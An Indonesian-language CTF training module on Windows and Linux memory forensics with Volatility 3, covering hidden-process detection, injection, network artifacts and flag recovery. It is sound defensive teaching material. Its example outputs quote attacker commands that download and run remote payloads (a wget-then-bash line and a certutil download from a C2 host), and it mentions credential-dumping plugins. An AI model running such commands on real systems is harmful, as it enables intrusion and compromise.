# 05. Memory Forensic

> Memory forensic adalah analisis isi RAM (volatile memory) untuk merekonstruksi apa yang sedang berjalan di sebuah sistem pada saat penangkapan: proses, koneksi jaringan, kredensial, dan kode jahat yang tidak pernah menyentuh disk. Di CTF LKSN 2026 (Modul C — Digital Forensic), soal kategori ini biasanya memberi sebuah image memori (`.raw`, `.mem`, `.lime`, `.dmp`) dan menuntut peserta menemukan proses jahat, command line attacker, atau flag yang hanya hidup di memori — kerja klasik untuk **Volatility 3**.

## Konsep

RAM menyimpan *ground truth* sebuah sistem hidup: daftar proses, region memori yang dieksekusi, soket jaringan terbuka, isi clipboard, kunci enkripsi, hingga string flag yang di-decrypt runtime. Banyak teknik serangan modern bersifat **fileless** (T1055 Process Injection, T1620 Reflective Loading) — payload hanya ada di memori, sehingga analisis disk saja akan buta. Memory forensic muncul di CTF ketika: flag di-decrypt di memori lalu dihapus dari disk, malware menyuntik dirinya ke proses sah, kredensial perlu di-dump dari `lsass.exe`, atau attacker meninggalkan jejak hanya di `cmd.exe`/PowerShell history.

Format image yang umum: **raw/dd** (linear physical memory), **crash dump** (`.dmp`), **LiME** (Linux), dan **AVML/ELF** dump. Volatility 3 membaca semuanya tanpa perlu menebak profil OS secara manual.

## Cara Kerja

Image memori adalah salinan byte-per-byte physical RAM. Volatility tidak "memahami" RAM begitu saja — ia merekonstruksi struktur kernel (`_EPROCESS`, `_ETHREAD`, `_FILE_OBJECT`, dll.) dengan **symbol table (ISF — Intermediate Symbol Format)** yang cocok untuk versi kernel target. Inilah perbedaan inti **Volatility 3 vs 2**: Vol2 butuh `--profile=Win7SP1x64` manual; **Volatility 3 auto-resolve symbol** dari GUID PDB kernel, jadi **tidak ada flag `--profile`**.

Dua strategi enumerasi yang menjadi akar banyak teknik:

- **List-walking** (`windows.pslist`) — mengikuti linked list `ActiveProcessLinks` milik kernel. Cepat, tapi bisa **ditipu DKOM** (Direct Kernel Object Manipulation): rootkit meng-unlink entri agar prosesnya tak terlihat.
- **Pool scanning** (`windows.psscan`) — memindai seluruh physical memory mencari signature pool tag `Proc`. Menemukan proses yang sudah ter-unlink atau sudah *terminated*. Selisih antara `pslist` dan `psscan` adalah indikator klasik proses tersembunyi.

Karena symbol-table auto-resolve mengandalkan kecocokan GUID PDB kernel dengan ISF yang tersedia, image dari OS yang sangat baru/lama bisa membutuhkan symbol pack tambahan. Jika `windows.info` gagal mengenali kernel, plugin lain akan mengembalikan hasil tak lengkap — ini akar dari banyak "kenapa output saya kosong" di lomba.

## Indikator / Cara Mengenali

Tanda-tanda di artefak memori yang patut dicurigai:

- Proses muncul di `psscan` tapi **tidak** di `pslist` → kemungkinan DKOM/unlinking.
- **PPID anomali**: `cmd.exe`/`powershell.exe` dengan parent bukan `explorer.exe`; banyak child dari `winword.exe`/`excel.exe` (macro → spawn).
- Nama proses mirip sistem tapi salah lokasi/ejaan: `svch0st.exe`, `lsass.exe` yang bukan child `wininit.exe`, `services.exe` ganda.
- Region memori `PAGE_EXECUTE_READWRITE` (RWX) berisi header `MZ` di tengah proses sah → injeksi (`windows.malfind`).
- Koneksi keluar ke IP/port mencurigakan dari proses yang seharusnya tidak ber-jaringan (`windows.netscan`).
- Handle ke file/registry/mutex aneh, atau DLL ter-load dari `%TEMP%`/`AppData`.

Sebagai baseline cepat, hafalkan parent-anak yang *sah* di Windows — penyimpangan dari ini adalah sinyal kuat:

| Proses | Parent normal | Catatan |
|---|---|---|
| `smss.exe` | `System` (PID 4) | Hanya satu instance utama |
| `wininit.exe` | `smss.exe` (sudah exit) | — |
| `services.exe` / `lsass.exe` | `wininit.exe` | `lsass.exe` **tunggal**; ganda = mencurigakan |
| `svchost.exe` | `services.exe` | Selalu pakai argumen `-k <group>` |
| `explorer.exe` | `userinit.exe` (sudah exit) | Shell user |
| `cmd.exe` / `powershell.exe` | `explorer.exe` (interaktif) | Parent `winword.exe`/`svchost.exe` = curiga |

## Langkah Analisis/Investigasi

1. **Identifikasi image** — `vol -f mem.raw windows.info` untuk memastikan OS/build dan bahwa symbol ter-resolve. Tanpa ini, plugin lain bisa gagal sunyi.
2. **Petakan proses** — jalankan `windows.pslist` dan `windows.pstree` untuk melihat hierarki; catat PID/PPID yang janggal.
3. **Cari yang tersembunyi** — bandingkan dengan `windows.psscan`; selisihnya adalah kandidat utama.
4. **Periksa command line** — `windows.cmdline` mengungkap argumen attacker (URL download, base64, flag mentah).
5. **Deteksi injeksi** — `windows.malfind` menyorot region RWX/anomali; dump untuk analisis lanjut.
6. **Telusuri jaringan** — `windows.netscan` memetakan C2/eksfiltrasi dan mengikat PID ke koneksi.
7. **Ekstrak artefak** — `windows.dumpfiles`, `windows.handles`, `windows.dlllist`, atau `windows.hashdump`/registry untuk mengangkat flag, kredensial, atau payload.
8. **Korelasi & dokumentasi** — satukan timeline (proses → command → jaringan → file) sebagai bukti POC.

## Tools

| Tool / Plugin | Fungsi singkat |
|---|---|
| `windows.info` | Identifikasi OS, build, dan verifikasi symbol table ter-resolve |
| `windows.pslist` | Daftar proses via list-walking `ActiveProcessLinks` |
| `windows.psscan` | Pool scan — menemukan proses tersembunyi/terminated (DKOM) |
| `windows.pstree` | Hierarki proses parent-child (anomali PPID) |
| `windows.cmdline` | Argumen command line tiap proses |
| `windows.cmdscan` / `windows.consoles` | Rekonstruksi **riwayat perintah** & buffer konsol `conhost`/`csrss` (lokasi flag klasik) |
| `windows.malfind` | Deteksi injeksi kode (region RWX, MZ tersembunyi) |
| `windows.vadinfo` / `windows.vadyarascan` | Petakan region VAD; `vadyarascan` memindai **seluruh VAD dengan rule YARA** (cari flag/IOC), `vadinfo --dump` mengekstrak region |
| `windows.netscan` | Soket & koneksi jaringan beserta PID pemilik |
| `windows.svcscan` | Pindai **service** Windows (persistence via service jahat) |
| `windows.filescan` + `windows.dumpfiles` | `filescan` enumerasi `_FILE_OBJECT` di memori → `dumpfiles --virtaddr`/`--pid` mengangkat isinya |
| `windows.registry.userassist` | Bukti **eksekusi GUI** (UserAssist) dari hive in-memory |
| `windows.handles` | Handle objek (file, registry, mutex) per proses |
| `windows.dlllist` | DLL ter-load (DLL dari path mencurigakan) |
| `windows.hashdump` / `windows.lsadump` | Dump hash kredensial & secret LSA |
| `linux.pslist` / `linux.pstree` | Daftar & hierarki proses Linux (`task_struct`) |
| `linux.psscan` | Pool/scan proses Linux — temukan proses ter-unlink/terminated |
| `linux.bash` | Pulihkan **riwayat bash** dari memori (command attacker) |
| `linux.malfind` | Region memori anomali (kode tersuntik) di proses Linux |
| `linux.check_syscall` / `linux.check_modules` | Deteksi **syscall hooking** & modul kernel tersembunyi (rootkit) |
| `linux.lsmod` | Daftar modul kernel ter-load |
| **WinPMEM** / **DumpIt** | Akuisisi RAM Windows ke image raw |
| **LiME** / **AVML** | Akuisisi RAM Linux ke image LiME/ELF |

## Contoh / Payload

**Akuisisi memori** (langkah nol — di lomba biasanya image sudah disediakan, tapi pahami caranya):

```bash
# Windows: WinPMEM (raw) atau DumpIt
winpmem_mini_x64.exe physmem.raw

# Linux: LiME (kernel module) -> format lime
sudo insmod lime.ko "path=/mnt/mem.lime format=lime"

# Linux/cloud: AVML (Microsoft) -> output ELF/raw, tanpa kompilasi modul
sudo ./avml mem.raw
```

**Analisis** — menemukan proses jahat lalu mengangkat flag dari sebuah image Windows:

```bash
# 0) Identifikasi image (Vol3 auto-resolve symbol; TANPA --profile)
vol -f infected.raw windows.info

# 1) Daftar proses + hierarki
vol -f infected.raw windows.pstree
# ... 1234  explorer.exe
#       4012  powershell.exe        <-- child explorer, wajar
#       4088  svch0st.exe           <-- PPID janggal, ejaan salah (typosquat)

# 2) Apakah ada yang disembunyikan? Bandingkan pslist vs psscan
# PENTING: kolom Vol3 = PID($1) PPID($2) ImageFileName($3)... -> ambil $1 (PID), bukan $2 (PPID)
vol -f infected.raw windows.pslist  | awk 'NR>1{print $1}' | sort > /tmp/list.txt
vol -f infected.raw windows.psscan  | awk 'NR>1{print $1}' | sort > /tmp/scan.txt
comm -13 /tmp/list.txt /tmp/scan.txt   # PID yang HANYA muncul di psscan = kandidat tersembunyi

# 3) Command line proses mencurigakan
vol -f infected.raw windows.cmdline --pid 4088
# 4088  svch0st.exe  "svch0st.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGo..."

# 4) Region tersuntik (RWX + MZ) lalu dump
vol -f infected.raw windows.malfind --pid 4088 --dump

# 5) Koneksi keluar dari PID itu (C2 / eksfil)
vol -f infected.raw windows.netscan | grep 4088
# TCPv4  10.10.0.5:49832  185.220.101.7:4444  ESTABLISHED  4088  svch0st.exe

# 6) Decode argumen -enc (base64 UTF-16LE khas PowerShell) -> ungkap stage-2
echo 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGo...' | base64 -d | iconv -f UTF-16LE -t UTF-8

# 7) Angkat flag yang ada di memori proses (mis. di handle/file/heap)
vol -f infected.raw windows.dumpfiles --pid 4088 --dump-dir ./out
strings -e l ./out/* | grep -iE 'LKSN\{|flag\{'
# flag{m3m0ry_dump_r3v34ls_4ll}

# Alternatif: flag tersembunyi di registry (hive in-memory)
vol -f infected.raw windows.registry.hivelist
vol -f infected.raw windows.registry.printkey \
    --key 'Software\Microsoft\Windows\CurrentVersion\Run'
```

**Plugin Windows tambahan** — sering memuat flag/IOC yang tak terlihat di `cmdline`/`pslist`:

```bash
# Riwayat perintah & buffer konsol (sering menyimpan command yang sudah di-clear di cmdline)
vol -f infected.raw windows.cmdscan      # CommandHistory (struktur conhost/csrss)
vol -f infected.raw windows.consoles     # buffer layar konsol UTUH (input + output)
#   -> baris "type flag.txt" / "certutil -urlcache -f http://c2/x.exe" beserta hasilnya

# Service jahat (persistence) — cari ImagePath ke %TEMP%/path acak / State=RUNNING anomali
vol -f infected.raw windows.svcscan | grep -iE 'temp|appdata|\\\\users\\\\public'

# Bukti eksekusi GUI dari UserAssist (hive in-memory)
vol -f infected.raw windows.registry.userassist

# Scan YARA terhadap SELURUH region VAD tiap proses (cari flag/byte pattern di memori)
vol -f infected.raw windows.vadyarascan --pid 4088 --yara-rules 'flag{'
vol -f infected.raw windows.vadyarascan --yara-file flag.yar    # rule lengkap

# Temukan _FILE_OBJECT lalu angkat isinya dari memori (mis. flag.txt yang sudah dihapus dari disk)
vol -f infected.raw windows.filescan | grep -iE 'flag|secret|\.txt'
#   ... 0x9e8a1f20  \Users\victim\Desktop\flag.txt
vol -f infected.raw windows.dumpfiles --virtaddr 0x9e8a1f20 --dump-dir ./out
strings -a ./out/* | grep -iE 'LKSN\{|flag\{'
```

**Analisis image Linux (Vol3)** — bukan hanya diakuisisi (LiME/AVML), tapi *dianalisis*. Vol3 me-resolve symbol Linux dari **banner kernel** (cocokkan ISF dari paket `volatility3-symbols` atau bangun dengan `dwarf2json`); tanpa simbol yang cocok, plugin `linux.*` mengembalikan output kosong:

```bash
# 0) Pastikan banner/symbol Linux dikenali (analog windows.info)
vol -f mem.lime banners.Banners        # tampilkan banner kernel utk pilih ISF yang cocok

# 1) Proses + hierarki (cari parent janggal: nginx/apache mem-spawn /bin/sh = webshell RCE)
vol -f mem.lime linux.pslist
vol -f mem.lime linux.pstree

# 2) Proses tersembunyi — Linux TIDAK pakai pslist-vs-psscan ala Windows;
#    deteksi via scan + cek tabel syscall/modul (rootkit meng-hook/unlink)
vol -f mem.lime linux.psscan
vol -f mem.lime linux.check_syscall    # entri syscall yang menunjuk ke alamat di luar kernel = HOOKED
vol -f mem.lime linux.check_modules    # modul yang ada di scan tapi tak ada di lsmod = tersembunyi
vol -f mem.lime linux.lsmod

# 3) Riwayat bash dari memori (command attacker walau ~/.bash_history sudah dihapus)
vol -f mem.lime linux.bash
#   1428  bash  2026-06-25 14:02:11  wget http://185.220.101.7/x.sh -O /tmp/.x; bash /tmp/.x

# 4) Kode tersuntik di proses Linux (region anomali r-x/rwx tanpa backing file)
vol -f mem.lime linux.malfind --pid 1428
```

## Anti-Forensik & Pitfall

**Teknik anti-forensik attacker** (mempersulit analisis memori):

- **DKOM / process unlinking** — entri `_EPROCESS` di-unlink dari `ActiveProcessLinks` sehingga **`pslist` buta**. Lawan dengan `psscan` (pool scanning). Inilah alasan langkah 2–3 di atas wajib.
- **Process hollowing / injection** (T1055.012) — kode jahat ditanam di proses sah (`explorer.exe`, `svchost.exe`) sehingga nama proses tampak normal; hanya `malfind`/perbandingan image-on-disk yang membongkarnya.
- **Fileless / reflective loading** — payload hanya hidup di memori, tak ada file di disk untuk di-carve; harus diangkat dari region memori langsung.
- **Anti-acquisition** — malware mendeteksi driver akuisisi (WinPMEM/DumpIt) atau menggunakan packing/enkripsi sehingga string flag baru terbentuk runtime dan terhapus cepat.
- **Memory wiping** — proses meng-zero buffer sensitif segera setelah pakai; penangkapan yang telat kehilangan artefak.

**Pitfall analis** (kesalahan yang membuat flag terlewat):

- **Hanya percaya `pslist`.** Tanpa `psscan`/`pstree`, proses ter-DKOM tak terlihat. Selalu silang-bandingkan.
- **Symbol/ISF salah atau hilang.** Jika kernel build tidak dikenal, plugin bisa mengembalikan output kosong tanpa error jelas — jalankan `windows.info` lebih dulu dan, bila perlu, suplai ISF yang sesuai.
- **Page smear.** Image dari mesin hidup yang sibuk (akuisisi non-atomik) bisa tidak konsisten; struktur sebagian rusak. Curigai bila banyak plugin gagal sebagian.
- **`malfind` false positive.** Tidak setiap region RWX itu jahat (JIT compiler, .NET). Validasi dengan konteks (PPID, command line, jaringan).
- **Salah jenis dump** — memperlakukan crash dump sebagai raw, atau memberi offset salah. Konfirmasi format sebelum menjalankan plugin berat.

## Mini-Lab

**Skenario:** Diberikan `case01.raw` (Windows 10 x64). Sebuah proses jahat menyamar sebagai layanan sistem, mengunduh stage kedua, lalu membuka koneksi C2. Flag tertanam di command line stage kedua.

1. **Lakukan:** `vol -f case01.raw windows.pstree` → temukan proses ber-PPID janggal / nama typosquat.
2. **Lakukan:** `vol -f case01.raw windows.psscan` dan bandingkan dengan `windows.pslist` → konfirmasi ada PID yang disembunyikan.
3. **Lakukan:** `vol -f case01.raw windows.cmdline --pid <PID>` dan `windows.netscan | grep <PID>`.
4. **Dapatkan:** decode argumen `-enc` (base64 → PowerShell) atau string pada `windows.dumpfiles` untuk memperoleh **`flag{...}`**, lalu tulis timeline proses→jaringan→flag sebagai POC (Judgement).

## Referensi & Latihan

- **Volatility Foundation** — dokumentasi Volatility 3 (`volatility3.readthedocs.io`), daftar lengkap plugin `windows.*`, dan cheat sheet.
- **The Art of Memory Forensics** (Ligh, Case, Levy, Walters) — referensi kanonik teknik & struktur.
- **MemLabs** (stuxnet999 / Abhiram Kumar) — seri lab CTF memory forensic bertahap, berbasis Volatility.
- **CyberDefenders** & **BlueTeam Labs Online** — challenge blue-team berbasis image memori nyata.
- **HackTheBox Sherlocks** — investigasi DFIR termasuk memory analysis.
- **SANS DFIR** posters & cheat sheet (Volatility, Windows artifacts) untuk referensi cepat saat lomba.
